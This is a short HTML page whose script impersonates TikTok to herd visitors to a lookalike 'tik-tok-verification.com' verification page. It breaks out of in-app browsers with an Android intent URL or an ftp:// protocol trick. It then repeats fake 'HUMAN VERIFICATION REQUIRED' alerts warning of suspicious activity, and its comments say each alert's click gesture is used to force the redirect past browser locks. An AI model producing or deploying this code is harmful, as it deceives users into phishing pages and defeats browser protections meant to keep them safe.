<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 20000;

    function triggerJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // THE NEW COMBO:
            // 1. Force the external app prompt using the "Broken" protocol that worked
            window.location.href = "ftp://" + urlNoProt;

            // 2. Authorize a NEW window/tab for the HTTPS version
            // This bypasses the 'FTP-Only' lock by creating a fresh request
            setTimeout(() => {
                window.open(targetUrl, '_system');
                window.location.assign(targetUrl);
            }, 100);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // Try to break out before the alert
        triggerJump();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                // The Alert pauses execution
                alert(header + body);

                // RELAY: Using the click 'gesture' to force the HTTPS link through the open door
                triggerJump();

                setTimeout(securityLogic, 350);
            }
        }, 350);
    }

    window.onload = securityLogic;
</script>

</body>
</html>
